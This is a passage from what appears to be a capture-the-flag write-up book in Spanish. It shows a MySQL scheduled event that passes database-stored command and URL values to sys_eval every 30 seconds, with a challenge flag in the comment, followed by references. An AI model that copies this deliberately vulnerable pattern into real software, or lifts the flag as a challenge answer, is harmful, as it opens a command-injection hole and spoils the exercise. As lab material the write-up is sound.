        Create Event: CREATE DEFINER=`root`@`localhost` EVENT `ev_crawl_pending_queue` ON SCHEDULE EVERY 30 SECOND STARTS '2019-11-14 17:32:37' ON COMPLETION NOT PRESERVE ENABLE COMMENT 'Check for commands that have no output ETSCTF_3f2652090448df5042' DO BEGIN
  DECLARE pid,done INT;
  DECLARE _pcur CURSOR FOR SELECT id FROM queue;
  DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;
  OPEN _pcur;
  read_loop: LOOP
    FETCH _pcur INTO pid;
    IF done THEN
      LEAVE read_loop;
    END IF;
  IF @debug IS NOT NULL THEN
    SELECT pid;
  END IF;
  UPDATE crawlers SET output=sys_eval(CONCAT(command, ' &quot;', url,'&quot;')) WHERE id=pid;
  DELETE FROM queue WHERE id=pid;
  END LOOP;
  CLOSE _pcur;
END
character_set_client: utf8mb4
collation_connection: utf8mb4_general_ci
  Database Collation: utf8mb4_general_ci
1 row in set (0.00 sec)
</code></pre>
<h2 id="referencias-15"><a class="header" href="#referencias-15">Referencias</a></h2>
<ul>
<li><a href="https://es.wikipedia.org/wiki/Web_scraping">Definición Web Scrapping</a>.</li>
<li><a href="https://www.w3.org/wiki/HashURI">W3C - Hash URI</a>.</li>
<li><a href="https://www.jenitennison.com/2011/03/06/hash-uris.html">Jeni Tennison - Hash URIs</a>.</li>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/event-scheduler.html">MySQL Reference Manual - Using the Event Scheduler</a>.</li>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/show-events.html">MySQL Reference Manual - SHOW EVENTS Statement</a>.</li>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/show-create-event.html">MySQL Reference Manual - SHOW CREATE EVENT Statement</a>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hajmetr"><a class="header" href="#hajmetr">Hajmetr</a></h1>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
    </body>
</html>
